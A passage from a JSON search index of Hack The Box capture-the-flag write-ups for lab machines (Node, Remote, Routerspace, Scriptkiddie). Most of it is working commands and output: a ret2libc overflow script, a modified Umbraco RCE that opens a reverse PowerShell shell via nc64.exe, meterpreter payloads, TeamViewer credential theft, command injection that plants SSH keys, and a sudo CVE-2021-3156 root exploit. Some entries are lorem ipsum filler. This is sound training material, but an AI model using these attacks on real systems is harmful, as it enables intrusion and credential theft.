-tx /lib32/libc.so.6 | grep “/bin” 15900b /bin/sh 15ab8c /bin/csh 15bf70 /etc/bindresvport.blacklist 15e84c /bin:/usr/bin\n/bin/sh address: 15900b\n\nDownload a skelleton exploit and import our variables. [root:/git/htb/node]# cat bof.py (master✱) import struct, subprocess\n\n#bufferSize = 508 # gdb -&gt; pattern create/offset libc_base_addr = 0xf7558000 # ldd /usr/local/bin/backup system_off = 0x0003a940 # readelf -s /lib32/libc.so.6 | grep system exit_off = 0x0002e7b0 # readelf -s /lib32/libc.so.6 | grep exit system_addr = libc_base_addr + system_off exit_addr = libc_base_addr + exit_off binSh = libc_base_addr + 0x15900b # strings -tx /lib32/libc.so.6 | grep “/bin”\nbuf = “A” * 512 buf += struct.pack(‘&lt;I’, system_addr) buf += struct.pack(‘&lt;I’, exit_addr) buf += struct.pack(‘&lt;I’, binSh)\ni = 0\nwhile True: i += 1 print ” &gt;&gt; BRUTE ATTEMPT: #%d” %i call = subprocess.call([“/usr/local/bin/backup”, “p3”, “45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474”, buf]) if (not call): break else: print ” &gt;&gt; Failed”\ntom@node:/dev/shm$ python bof.py — snip — &gt;&gt; BRUTE ATTEMPT: #15 — snip — # id uid=0(root) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin) # cat /root/root.txt 1722e99ca5f353b362556a62bd5e6be0\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nMongoDB Insert Document: https://www.tutorialspoint.com/mongodb/mongodb_insert_document.htm https://www.bookstack.cn/read/mongodb-4.2-manual/c886d0f31f1fef7d.md\nBOF 32 bit: https://bufferoverflows.net/rop-manual-exploitation-on-x32-linux/"
  },
  {
    "objectID": "posts/2020-05-07-htb-writeup-remote/2020-05-07-htb-writeup-remote.html",
    "href": "posts/2020-05-07-htb-writeup-remote/2020-05-07-htb-writeup-remote.html",
    "title": "Remote - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nroot@p3:/opt/htb/machines/remote# nmap -Pn -sC -sV -n 10.10.10.180 PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd |ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: | SYST: Windows_NT 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |http-title: Home - Acme Widgets 111/tcp open rpcbind? | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/tcp6 rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 2,3,4 111/udp6 rpcbind | 100003 2,3 2049/udp nfs | 100003 2,3 2049/udp6 nfs | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100005 1,2,3 2049/tcp mountd | 100005 1,2,3 2049/tcp6 mountd | 100005 1,2,3 2049/udp mountd | 100005 1,2,3 2049/udp6 mountd | 100021 1,2,3,4 2049/tcp nlockmgr | 100021 1,2,3,4 2049/tcp6 nlockmgr | 100021 1,2,3,4 2049/udp nlockmgr | 100021 1,2,3,4 2049/udp6 nlockmgr | 100024 1 2049/tcp status | 100024 1 2049/tcp6 status | 100024 1 2049/udp status | 100024 1 2049/udp6 status 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 2049/tcp open rpcbind Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows\nHost script results: |_smb2-time: Protocol negotiation failed (SMB2)\n\nDIRB: + http://10.10.10.180/about-us (CODE:200|SIZE:5441) + http://10.10.10.180/blog (CODE:200|SIZE:5001) + http://10.10.10.180/Blog (CODE:200|SIZE:5001) + http://10.10.10.180/contact (CODE:200|SIZE:7880) + http://10.10.10.180/Contact (CODE:200|SIZE:7880) + http://10.10.10.180/home (CODE:200|SIZE:6703) + http://10.10.10.180/Home (CODE:200|SIZE:6703) + http://10.10.10.180/install (CODE:302|SIZE:126) + http://10.10.10.180/intranet (CODE:200|SIZE:3323) + http://10.10.10.180/master (CODE:500|SIZE:3420) + http://10.10.10.180/people (CODE:200|SIZE:6739) + http://10.10.10.180/People (CODE:200|SIZE:6739) + http://10.10.10.180/person (CODE:200|SIZE:2741) + http://10.10.10.180/product (CODE:500|SIZE:3420) + http://10.10.10.180/products (CODE:200|SIZE:5328) + http://10.10.10.180/Products (CODE:200|SIZE:5328) + http://10.10.10.180/umbraco (CODE:200|SIZE:4040)\nNIKTO: + Server banner has changed from ’’ to ‘Microsoft-IIS/10.0’ which may suggest a WAF, load balancer or proxy is in place + /umbraco/ping.aspx: Umbraco ping page found\n\nBrowsing the webpage we find a few employees, add them to a user list. Both /umbraco and /install forwards to a login page. Rpcclient without user and/or anonymous user is not possible. Anonymous FTP is allowed, however there’s nothing on the share.\nLooking on the rpcbind-ports however we can see some enumerated nfs-shares showing. We can further enumterate this using nmap scripts (nfs-ls, nfs-showmount & nfs-statfs)\nroot@p3:/opt/htb/machines/remote# nmap –script nfs-* 10.10.10.180 .. 111/tcp open rpcbind | nfs-ls: Volume /site_backups | access: Read Lookup NoModify NoExtend NoDelete NoExecute | PERMISSION UID GID SIZE TIME FILENAME | rwx—— 4294967294 4294967294 4096 2020-02-23T18:35:48 . | ?????????? ? ? ? ? .. | rwx—— 4294967294 4294967294 64 2020-02-20T17:16:39 App_Browsers | rwx—— 4294967294 4294967294 4096 2020-02-20T17:17:19 App_Data | rwx—— 4294967294 4294967294 4096 2020-02-20T17:16:40 App_Plugins | rwx—— 4294967294 4294967294 8192 2020-02-20T17:16:42 Config | rwx—— 4294967294 4294967294 64 2020-02-20T17:16:40 aspnet_client | rwx—— 4294967294 4294967294 49152 2020-02-20T17:16:42 bin | rwx—— 4294967294 4294967294 64 2020-02-20T17:16:42 css | rwx—— 4294967294 4294967294 152 2018-11-01T17:06:44 default.aspx | | nfs-showmount: | /site_backups | nfs-statfs: | Filesystem 1K-blocks Used Available Use% Maxfilesize Maxlink |_ /site_backups 31119356.0 12170588.0 18948768.0 40% 16.0T 1023\nCreate a new folder and mount the directory site_backups to review it’s content. root@p3:/opt/htb/machines/remote# mount -t nfs 10.10.10.180:/site_backups tmpMount/ root@p3:/opt/htb/machines/remote# ls -al tmpMount/ total 123 drwx—— 2 nobody 4294967294 4096 Feb 23 19:35 . drwxr-xr-x 3 root root 4096 Apr 23 16:05 .. drwx—— 2 nobody 4294967294 64 Feb 20 18:16 App_Browsers drwx—— 2 nobody 4294967294 4096 Feb 20 18:17 App_Data drwx—— 2 nobody 4294967294 4096 Feb 20 18:16 App_Plugins drwx—— 2 nobody 4294967294 64 Feb 20 18:16 aspnet_client drwx—— 2 nobody 4294967294 49152 Feb 20 18:16 bin drwx—— 2 nobody 4294967294 8192 Feb 20 18:16 Config drwx—— 2 nobody 4294967294 64 Feb 20 18:16 css -rwx—— 1 nobody 4294967294 152 Nov 1 2018 default.aspx -rwx—— 1 nobody 4294967294 89 Nov 1 2018 Global.asax drwx—— 2 nobody 4294967294 4096 Feb 20 18:16 Media drwx—— 2 nobody 4294967294 64 Feb 20 18:16 scripts drwx—— 2 nobody 4294967294 8192 Feb 20 18:16 Umbraco drwx—— 2 nobody 4294967294 4096 Feb 20 18:16 Umbraco_Client drwx—— 2 nobody 4294967294 4096 Feb 20 18:16 Views -rwx—— 1 nobody 4294967294 28539 Feb 20 06:57 Web.config\nEnumerate the directory and we find Umbraco.sdf. Using strings we find users and their password hash.\nroot@nidus:/opt/htb/machines/remote/tmpMount# find . -iname umbraco* .. ./App_Data/Umbraco.sdf\nroot@nidus:/opt/htb/machines/remote/tmpMount/App_Data# strings Umbraco.sdf Administrator admin default en-US Administrator admin default en-US b22924d5-57de-468e-9df4-0961cf6aa30d Administrator admin b8be16afba8c314ad33d812f22a04991b90e2aaa{“hashAlgorithm”:“SHA1”} en-US f8512f97-cab1-4a4b-a49f-0a2054c47a1d admin admin@htb.local b8be16afba8c314ad33d812f22a04991b90e2aaa{“hashAlgorithm”:“SHA1”} admin@htb.local en-USfeb1a998-d3bf-406a-b30b-e269d7abdf50 admin admin@htb.local b8be16afba8c314ad33d812f22a04991b90e2aaa{“hashAlgorithm”:“SHA1”} admin@htb.local en-US82756c26-4321-4d27-b429-1b5c7c4f882f smith smith@htb.local jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={“hashAlgorithm”:“HMACSHA256”} smith@htb.local en-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e ssmith smith@htb.local jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={“hashAlgorithm”:“HMACSHA256”} smith@htb.local en-US7e39df83-5e64-4b93-9702-ae257a9b9749 ssmith ssmith@htb.local 8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={“hashAlgorithm”:“HMACSHA256”} ssmith@htb.local en-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32\nUse hashcat to crack the SHA1 hash of user admin@htb.local\nroot@nidus:/opt/htb/machines/remote# hashcat -a0 -m100 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt –force .. Status………..: Cracked ..\nroot@nidus:/opt/htb/machines/remote# cat cracked.txt b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese\nWe are now able to login to the portal, 10.10.10.180/umbraco, with found credentials. A quick search for “Umbraco” on google tells us that it has a Remote Code Execution vuln. Download the script from ExploitDB and modify it to first return a ping. Once we get a ping back, we can change the code (‘string cmd’ and ‘proc.StartInfo.FileName’) to get a reverse shell.\nroot@nidus:/opt/htb/machines/remote# cat 46153.py .. string cmd = “//10.10.14.2/pub-share/nc64.exe 10.10.14.2 4488 -e powershell”; System.Diagnostics.Process proc = new System.Diagnostics.Process();\nproc.StartInfo.FileName = “powershell.exe”; ..\nroot@nidus:/opt/htb/machines/remote# rlwrap nc -lvnp 4488 listening on [any] 4488 … connect to [10.10.14.2] from (UNKNOWN) [10.10.10.180] 49694 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved.\nPS C:&gt; whoami whoami iis apppool\nPS C:&gt; type user.txt type user.txt 439732ceaf451f5ed3f240011174e757\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nEnumerate the boxes services and we find a vulnerable TeamViewer (7) service. PS C:&gt; tasklist /SVC tasklist /SVC\nImage Name PID Services ========================= ======== ============================================ .. TeamViewer_Service.exe 3080 TeamViewer7\nGoogling about TeamViewer7 exploits we find a msf module that finds storde credentials and crack them. To use msf modules we need a meterpreter session so start by creating a meterpreter payload and trigger a reverse by editing the first Umbraco python vuln.\nroot@nidus:/opt/htb/machines/remote# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4499 -f exe &gt; rev-meterpreter.exe root@nidus:/opt/htb/machines/remote# cat meterpreter.py .. string cmd = “//10.10.14.2/pub-share/rev-meterpreter.exe”; System.Diagnostics.Process proc = new System.Diagnostics.Process();\nproc.StartInfo.FileName = “powershell.exe”; ..\nroot@nidus:/opt/htb/machines/remote# msfdb run msf5 &gt; use exploit/multi/handler msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) &gt; set lhost 10.10.14.2 msf5 exploit(multi/handler) &gt; set lport 4499 msf5 exploit(multi/handler) &gt; run\nroot@nidus:/opt/htb/machines/remote# python meterpreter.py .. [*] Meterpreter session 1 opened (10.10.14.2:4499 -&gt; 10.10.10.180:49710) at 2020-05-07 15:05:31 +0200\nmeterpreter &gt;\nCopy the module (https://whynotsecurity.com/blog/teamviewer/) and paste it in /root/.msf4/modules\nroot@nidus:~/.msf4/modules# cp /opt/htb/machines/remote/remote-tv.rb /root/.msf4/modules/post/windows/gather/credentials/ root@nidus:~/.msf4/modules# ls -al /root/.msf4/modules/post/windows/gather/credentials/ total 16 drwxr-xr-x 2 root root 4096 May 7 14:57 . drwxr-xr-x 3 root root 4096 May 7 14:56 .. -rw-r–r– 1 root root 4523 May 7 14:57 remote-tv.rb\nBackground the meterpreter session and update the database. meterpreter &gt; background [*] Backgrounding session 1… msf5 exploit(multi/handler) &gt; updatedb [*] exec: updatedb\nUse the custom TeamViewer module to search for stored passwords.\nmsf5 exploit(multi/handler) &gt; search teamviewer\nMatching Modules ================\n  #  Name                                                  Disclosure Date  Rank    Check  Description\n  -  ----                                                  ---------------  ----    -----  -----------\n  0  post/windows/gather/credentials/teamviewer_passwords                   normal  No     Windows Gather TeamViewer Passwords\nmsf5 exploit(multi/handler) &gt; use post/windows/gather/credentials/teamviewer_passwords msf5 post(windows/gather/credentials/teamviewer_passwords) &gt; options\nModule options (post/windows/gather/credentials/teamviewer_passwords):\n  Name          Current Setting  Required  Description\n  ----          ---------------  --------  -----------\n  SESSION                        yes       The session to run this module on.\n  WINDOW_TITLE  TeamViewer       no        Specify a title for getting the window handle, e.g. TeamViewer\nmsf5 post(windows/gather/credentials/teamviewer_passwords) &gt; set session 1 msf5 post(windows/gather/credentials/teamviewer_passwords) &gt; run\n[*] Finding TeamViewer Passwords on REMOTE [+] Found Unattended Password: !R3m0te! [+] Passwords stored in: /root/.msf4/loot/20200507151315_default_10.10.10.180_host.teamviewer__218524.txt [*] &lt;—————- | Using Window Technique | —————-&gt; [*] TeamViewer’s language setting options are ’’ [*] TeamViewer’s version is ’’ [-] Unable to find TeamViewer’s process [*] Post module execution completed\nUse evil-winrm to grab root.txt\nroot@nidus:/opt/htb/machines/remote# evil-winrm -i 10.10.10.180 -u Administrator -p ‘!R3m0te!’ Evil-WinRM PS C:&gt; type root.txt e68c6abb4d764732be88aaed8f733990\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nTeamViewer Exploit https://whynotsecurity.com/blog/teamviewer/\nImport MSF-module https://medium.com/@pentest_it/how-to-add-a-module-to-metasploit-from-exploit-db-d389c2a33f6d"
  },
  {
    "objectID": "posts/2022-03-28-htb-writeup-routerspace/2022-03-28-htb-writeup-routerspace.html",
    "href": "posts/2022-03-28-htb-writeup-routerspace/2022-03-28-htb-writeup-routerspace.html",
    "title": "Routerspace - Hack The Box",
    "section": "",
    "text": "USER\n\nStep 1\nnmap:\n┌──(void㉿void)-[/htb/routerspace]\n└─$ nmap -p- 10.10.11.148     \nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\n\n┌──(void㉿void)-[/htb/routerspace]\n└─$ nmap -p22,80 -sCV 10.10.11.148\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-28 09:22 CEST\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     (protocol 2.0)\n| fingerprint-strings: \n|   NULL: \n|_    SSH-2.0-RouterSpace Packet Filtering V1\n| ssh-hostkey: \n|   3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA)\n|   256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA)\n|_  256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519)\n80/tcp open  http\n| fingerprint-strings: \n|   FourOhFourRequest: \n|     HTTP/1.1 200 OK\n|     X-Powered-By: RouterSpace\n|     X-Cdn: RouterSpace-77288\n|     Content-Type: text/html; charset=utf-8\n|     Content-Length: 70\n|     ETag: W/\"46-abbFyEBeXh9CSfIO4E5mGzrEQI0\"\n|     Date: Mon, 28 Mar 2022 07:24:55 GMT\n|     Connection: close\n|     Suspicious activity detected !!! {RequestID: zLw qUksX fN OW A }\n|   GetRequest: \n|     HTTP/1.1 200 OK\n|     X-Powered-By: RouterSpace\n|     X-Cdn: RouterSpace-62862\n|     Accept-Ranges: bytes\n|     Cache-Control: public, max-age=0\n|     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT\n|     ETag: W/\"652c-17d476c9285\"\n|     Content-Type: text/html; charset=UTF-8\n|     Content-Length: 25900\n|     Date: Mon, 28 Mar 2022 07:24:54 GMT\n|     Connection: close\n|     &lt;!doctype html&gt;\n|     &lt;html class=\"no-js\" lang=\"zxx\"&gt;\n|     &lt;head&gt;\n|     &lt;meta charset=\"utf-8\"&gt;\n|     &lt;meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\"&gt;\n|     &lt;title&gt;RouterSpace&lt;/title&gt;\n|     &lt;meta name=\"description\" content=\"\"&gt;\n|     &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt;\n|     &lt;link rel=\"stylesheet\" href=\"css/bootstrap.min.css\"&gt;\n|     &lt;link rel=\"stylesheet\" href=\"css/owl.carousel.min.css\"&gt;\n|     &lt;link rel=\"stylesheet\" href=\"css/magnific-popup.css\"&gt;\n|     &lt;link rel=\"stylesheet\" href=\"css/font-awesome.min.css\"&gt;\n|     &lt;link rel=\"stylesheet\" href=\"css/themify-icons.css\"&gt;\n|   HTTPOptions: \n|     HTTP/1.1 200 OK\n|     X-Powered-By: RouterSpace\n|     X-Cdn: RouterSpace-79870\n|     Allow: GET,HEAD,POST\n|     Content-Type: text/html; charset=utf-8\n|     Content-Length: 13\n|     ETag: W/\"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo\"\n|     Date: Mon, 28 Mar 2022 07:24:54 GMT\n|     Connection: close\n|     GET,HEAD,POST\n|   RTSPRequest, X11Probe: \n|     HTTP/1.1 400 Bad Request\n|_    Connection: close\n|_http-title: RouterSpace\n|_http-trane-info: Problem with XML parsing of /evox/about\n\n\n[root:/git/htb/pandora]# nmap -sU --top-port=20 --open 10.10.11.136\nPORT     STATE         SERVICE\n67/udp   open|filtered dhcps\n68/udp   open|filtered dhcpc\n135/udp  open|filtered msrpc\n137/udp  open|filtered netbios-ns\n138/udp  open|filtered netbios-dgm\n161/udp  open          snmp\n520/udp  open|filtered route\n4500/udp open|filtered nat-t-ike\ndirb:\nN/A\nnikto:\n+ Uncommon header 'x-cdn' found, with contents: RouterSpace-66427\nffuf:\n$ ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.11.148/FUZZ -fs 50-95\ncss                     [Status: 301, Size: 173, Words: 7, Lines: 11]\nfonts                   [Status: 301, Size: 177, Words: 7, Lines: 11]\nimg                     [Status: 301, Size: 173, Words: 7, Lines: 11]\njs                      [Status: 301, Size: 171, Words: 7, Lines: 11]\n\n$ ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.11.148/FUZZ.html -fs 50-95\ncontact                 [Status: 200, Size: 46439, Words: 10270, Lines: 358]\n\n\n\nStep 2\nVisit the website and we find multiple download buttons, all leading to RouterSpace.apk. Before we analyze the binary, we look on contact.html, while there we find features.html and Pricing.html, both gives some strange output.\n$ curl -v http://10.10.11.148/features.html\n&gt; GET /features.html HTTP/1.1\n&gt; Host: 10.10.11.148\n\n&lt; HTTP/1.1 200 OK\n&lt; X-Powered-By: RouterSpace\n&lt; X-Cdn: RouterSpace-65007\n&lt; \nSuspicious activity detected !!! {RequestID: Z   73Mv z    F F i }\n\n                                                                                                           \n┌──(void㉿void)-[/htb/routerspace]\n└─$ curl -v http://10.10.11.148/Pricing.html \n&gt; GET /Pricing.html HTTP/1.1\n&gt; Host: 10.10.11.148\n\n&lt; HTTP/1.1 200 OK\n&lt; X-Powered-By: RouterSpace\n&lt; X-Cdn: RouterSpace-85902\n&lt; \nSuspicious activity detected !!! {RequestID: l2  Pmi   K lhy9 vL C yj6a  }\nUnzip the .apk-file and start analyzing the data.. .. we find host name in apk-unpack/META-INF/CERT.RSA - routerspace.htb\nNothing more of value at first glance. As this is a easy box we should probably look for something obvious, like a public key for the SSH service, some API call or similar. Analyzing the data further with jd-gui and MobSF doesn’t give anything of value either.\nChange approach and try to emulate the apk using Anbox and adb:\nInstall (if \"ls -1 /dev/{ashmem,binder}\" gives not found):\n$ apt install dkms linux-headers-amd64\n$ git clone https://github.com/anbox/anbox-modules.git\n$ sudo ./INSTALL.sh\n$ sudo modprobe ashmem_linux && sudo modprobe binder_linux\n$ ls -1 /dev/{ashmem,binder}\n\n$ sudo apt install snapd\n$ service snapd start\n$ sudo snap install --devmode --beta anbox\n\n$ sudo apt install android-tools-adb\n$ adb devices\n * daemon not running; starting now at tcp:5037\n * daemon started successfully\n List of devices attached\n$ anbox launch --package=org.anbox.appmgr\n$ adb devices                            \n List of devices attached\n emulator-5558  device\n$ adb install RouterSpace.apk            \n Performing Streamed Install\n Success\n$ anbox.appmgr \n\n\nIf not able to enable proxy, kill all adb and anbox servies and try again.\n$ kill ...\n$ adb devices\n$ adb shell settings put global http_proxy 192.168.101.187:8181\n$ anbox.appmgr\nBurp Proxy Settings: \nWe are now able to capture the Check Status API call in Burp. \n\n\n\nStep 3\nWe have one data parameter to play with, ip, and we quickly find that it’s not sanitized and vulnerable for command injection.\n\nGenerate a new SSH key, inject it and login as user Paul. Grab user.txt.\n┌──(void㉿void)-[/htb/routerspace]\n└─$ ssh-keygen -t rsa -b 4096 -f paul-id_rsa\n\n┌──(void㉿void)-[/htb/routerspace]\n└─$ cat paul-id_rsa.pub  \nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC [... snip ...]\n\nInject the payload in Burp Repeater: \nmkdir -p /home/paul/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC [... snip ...]' &gt; /home/paul/.ssh/authorized_keys\n\n┌──(void㉿void)-[/htb/routerspace]\n└─$ ssh paul@routerspace.htb -i paul-id_rsa\n\npaul@routerspace:~$ id && cat user.txt \nuid=1001(paul) gid=1001(paul) groups=1001(paul)\ne8f2d33e776f9e917eeab833f5dff7a6\n\n\n\n\nROOT\n\nStep 1\nWith some quick manual enumeration we find that the sudo version is old and vulnerable to CVE-2021-3156.\npaul@routerspace:~$ sudo --version\nSudo version 1.8.31\nSudoers policy plugin version 1.8.31\nSudoers file grammar version 46\nSudoers I/O plugin version 1.8.31\n\npaul@routerspace:~$ lsb_release -a\nNo LSB modules are available.\nDistributor ID: Ubuntu\nauthor: \"0xPThree\"\ndescription:    Ubuntu 20.04.3 LTS\nRelease:    20.04\nCodename:   focal\n\n┌──(void㉿void)-[/htb/routerspace]\n└─$ scp -i paul-id_rsa -rp sudo-exploit-main paul@routerspace.htb:/dev/shm                                                                                1 ⨯\nsice.c                                                                                                                      100%  176     5.5KB/s   00:00    \nREADME.md                                                                                                                   100%  234     7.6KB/s   00:00    \nMakefile                                                                                                                    100%   95     3.0KB/s   00:00    \nexploit.c                                                                                                                   100% 2651    82.9KB/s   00:00 \n\npaul@routerspace:/dev/shm/sudo-exploit-main$ make\ngcc exploit.c -o exploit\nexploit.c: In function ‘main’:\nexploit.c:75:5: warning: implicit declaration of function ‘execve’ [-Wimplicit-function-declaration]\n   75 |     execve(argv[0], argv, env);\n      |     ^~~~~~\nmkdir libnss_X\ngcc -g -fPIC -shared sice.c -o libnss_X/X.so.2\n\npaul@routerspace:/dev/shm/sudo-exploit-main$ ./exploit \nroot@routerspace:/dev/shm/sudo-exploit-main# id && cat /root/root.txt\nuid=0(root) gid=1001(paul) groups=1001(paul)\n3d6de1c1362a1d59bd130fd45d895e45\n\n\n\n\nReferences\nInstall Anbox: https://docs.anbox.io/userguide/install_kernel_modules.html\nCVE-2021-3156: https://github.com/redhawkeye/sudo-exploit"
  },
  {
    "objectID": "posts/2019-03-25-htb-writeup-netmon/2019-03-25-htb-writeup-netmon.html",
    "href": "posts/2019-03-25-htb-writeup-netmon/2019-03-25-htb-writeup-netmon.html",
    "title": "Netmon - Hack The Box",
    "section": "",
    "text": "No writeup available.."
  },
  {
    "objectID": "posts/2021-02-19-htb-writeup-scriptkiddie/2021-02-19-htb-writeup-scriptkiddie.html",
    "href": "posts/2021-02-19-htb-writeup-scriptkiddie/2021-02-19-htb-writeup-scriptkiddie.html",
    "title": "Scriptkiddie - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\n[root:/git/htb/scriptkiddie]# nmap -Pn -sCV -n 10.10.10.226 (master✱) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA) | 256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA) |_ 256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519) 5000/tcp open http Werkzeug httpd 0.16.1 (Python 3.8.5) |_http-server-header: Werkzeug/0.16.1 Python/3.8.5 |_http-title: k1d’5 h4ck3r t00l5 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nDIRB: -\nNIKTO: -\n\nTesting the input fields for input sanitation, find nothing of use. Being able to upload payload template files sounds odd and is probably worth digging deeper in.\nMetasploit has a module for creating malicious APK templates, lets try it and see if we can grab a reverse shell.\nmsf6 &gt; use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection [*] No payload configured, defaulting to cmd/unix/reverse_netcat msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) &gt; set LHOSTS 10.10.14.4 LHOSTS =&gt; 10.10.14.4 msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) &gt; set LPORT 4488 LPORT =&gt; 4488 msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) &gt; run [+] msf.apk stored at /root/.msf4/local/msf.apk\n[root:/git/htb/scriptkiddie]# mv /root/.msf4/local/msf.apk exploit.apk\nUploading the template (exploit.apk) and pressing “generate” gives me the error message: “Something went wrong”. Read about it on the forums and find someone saying to make sure Metasploit is running on the latest version. Update, upgrade and test again.\nmsf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) &gt; set lhost 10.10.14.4 lhost =&gt; 10.10.14.4 msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) &gt; set lport 4488 lport =&gt; 4488 